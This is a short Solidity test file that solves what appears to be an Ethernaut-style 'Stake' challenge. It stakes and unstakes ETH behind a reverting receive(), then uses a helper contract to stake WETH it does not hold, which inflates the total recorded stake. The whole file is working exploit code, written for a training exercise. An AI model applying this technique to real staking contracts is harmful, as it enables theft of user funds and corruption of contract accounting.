// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

interface IStaker {
  function WETH() external returns (address);
  function StakeETH() external payable;
  function StakeWETH(uint256 amount) external returns (bool);
  function Unstake(uint256 amount) external returns (bool);
}

interface IWETH {
  function approve(address spender, uint256 amount) external;
}

contract StakeTest is Test {
  address private challengeAddress;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x32FFB8d4244B350F5D3E074e9b731A135531B975);
  }

  function testExploit() public {
    // Makes
    //   stakeAddress.balance != 0
    IStaker(challengeAddress).StakeETH{value: 0.001 ether + 1 wei}();

    // Makes
    //  stake.UserStake(_player) == 0
    // but since this contract's `receive()` reverts, keeps
    //  stakeAddress.balance != 0
    IStaker(challengeAddress).Unstake(0.001 ether + 1 wei);

    // We need the help of this contract to inflate
    // the Staker's stake balance
    AttackAssistant attackAssistant = new AttackAssistant(challengeAddress);
    attackAssistant.attack();

    utils.submitLevelInstance(challengeAddress);
  }

  receive() external payable {
    // This one helps with the condition
    //   "Your staked balance must be 0.""
    revert("Not receiving funds here.");
  }
}

contract AttackAssistant {
  address private challengeAddress;

  constructor(address _challengeAddress) payable {
    challengeAddress = _challengeAddress;
  }

  function attack() external {
    // Stakes unexisting funds
    // (We do not have 0.001 ether + 2 wei in WETH)
    // Makes
    //    stake.totalStaked() > stakeAddress.balance
    address wethAddress = IStaker(challengeAddress).WETH();
    IWETH(wethAddress).approve(challengeAddress, type(uint256).max);
    IStaker(challengeAddress).StakeWETH(0.001 ether + 2 wei);
  }
}
